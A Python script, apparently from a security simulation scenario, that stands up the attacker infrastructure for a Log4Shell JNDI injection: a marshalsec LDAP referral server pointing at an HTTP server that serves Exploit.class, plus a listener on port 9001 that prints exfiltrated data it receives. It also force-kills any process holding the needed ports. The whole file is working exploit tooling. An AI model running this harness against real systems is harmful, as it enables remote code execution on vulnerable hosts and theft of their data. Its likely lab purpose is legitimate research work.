import http.server, socketserver, subprocess, socket, functools, time, os, signal

# configs
LDAP_PORT = 1389
HTTP_PORT = 8000
LEAK_PORT = 9001
MARSHALSEC_JAR = 'scenarios/log4shell/sim/marshalsec-0.0.3-SNAPSHOT-all.jar'
EXPLOIT_CLASS  = 'Exploit.class'
EXPLOIT_DIR    = 'scenarios/log4shell/sim'

def is_port_in_use(port, host='0.0.0.0'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((host, port)) == 0

def ensure_port_available(port, host='0.0.0.0', timeout=65):
    # kill the program using the port (if any)
    try:
        output = subprocess.check_output(f'lsof -t -i:{port}', shell=True, text=True, stderr=subprocess.DEVNULL)
        pids = [int(p) for p in output.strip().split('\n') if p]

        for pid in pids:
            try:
                os.kill(pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
    except subprocess.CalledProcessError:
        pass

    # wait for the port to exit the TIME_WAIT status
    start_time = time.time()
    while time.time() - start_time < timeout:
        if not is_port_in_use(port, host=host):
            return

        time.sleep(1)

    raise TimeoutError(f'Failed to open port {port}.')

def get_host_ip():
    '''Get host IP address.'''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip = s.getsockname()[0]
    s.close()

    return ip

def start_ldap_server():
    '''Start the LDAPRefServer.'''
    if is_port_in_use(LDAP_PORT):
        ensure_port_available(LDAP_PORT)

    host_ip = get_host_ip()
    url = f'http://{host_ip}:{HTTP_PORT}/#Exploit'
    return subprocess.Popen(f'java -cp {MARSHALSEC_JAR} marshalsec.jndi.LDAPRefServer {url}', shell=True, stdout=subprocess.DEVNULL)

def start_http_server():
    '''Serve Exploit.class on HTTP.'''
    if is_port_in_use(HTTP_PORT):
        ensure_port_available(HTTP_PORT)

    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=EXPLOIT_DIR)
    with socketserver.TCPServer(('', HTTP_PORT), handler) as httpd:
        httpd.serve_forever()

def start_leak_server(print_exfil: bool = True):
    '''Start a simple exfiltration log server on port 9001.'''
    if is_port_in_use(LEAK_PORT):
        ensure_port_available(LEAK_PORT)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', LEAK_PORT))
        s.listen()

        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(4096)
                if print_exfil:
                    print(f'[!] Exfiltration from {addr[0]}:{addr[1]}:\n{data.decode(errors='ignore')}')
